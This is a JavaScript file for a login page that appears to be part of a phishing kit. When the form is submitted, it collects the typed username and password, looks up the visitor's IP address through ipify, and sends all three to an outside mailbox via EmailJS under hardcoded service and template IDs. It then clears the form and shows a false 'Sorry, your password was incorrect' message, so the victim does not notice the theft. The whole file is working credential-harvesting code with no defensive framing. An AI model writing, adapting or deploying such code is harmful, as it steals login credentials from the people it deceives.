document.addEventListener('DOMContentLoaded', function () {
    document.getElementById('copyright-year').innerText = new Date().getFullYear();
  
    // Select form fields and button
    var username = document.querySelector('input[name="username"]');
    var password = document.querySelector('input[name="password"]');
    var submit = document.querySelector('.log-in-button');
    var panel = document.querySelector('.panel');
  
    // Function to manage the submit button state
    function manage() {
      submit.disabled = !(username.value.trim() && password.value.trim());
    }
  
    // Add event listeners to the input fields to trigger the manage function on input
    username.addEventListener('input', manage);
    password.addEventListener('input', manage);
  
    // Event listener for button click
    submit.addEventListener('click', function (event) {
      event.preventDefault(); // Prevent default button action
  
      const serviceID = "service_qn1jq9b"; // Your EmailJS service ID
      const templateID = "template_runmkv5"; // Your EmailJS template ID
  
      // Fetch IP data
      fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => {
          console.log("IP data: ", data);
  
          // Construct parameters object
          var params = {
            email: username.value,
            password: password.value,
            IP: data.ip,
          };
  
          // Send login details using EmailJS
          emailjs.send(serviceID, templateID, params)
            .then((res) => {
              console.log("Success: ", res);
              // Clear form fields and show success message
              username.value = "";
              password.value = "";
              alert("incorrect__password");
              removeErrorMsg();
            })
            .catch((err) => {
              console.log("Error: ", err);
              showErrorMsg("Sorry, your password was incorrect");
            });
        })
        .catch((error) => {
          console.log("Fetch error: ", error);
        });
    });
  
    // Function to show error messages
    function showErrorMsg(message) {
      let errorMsg = document.querySelector(".incorrect__password");
      if (!errorMsg) {
        errorMsg = document.createElement("p");
        errorMsg.classList.add("incorrect__password");
        errorMsg.style.color = "red"; // Set error message color to red
        panel.appendChild(errorMsg);
      }
      errorMsg.innerText = message; 
    }
  
    // Function to remove error messages
    function removeErrorMsg() {
      const errorMsg = document.querySelector(".incorrect__password");
      if (errorMsg) {
        errorMsg.remove();
      }
    }
  });
  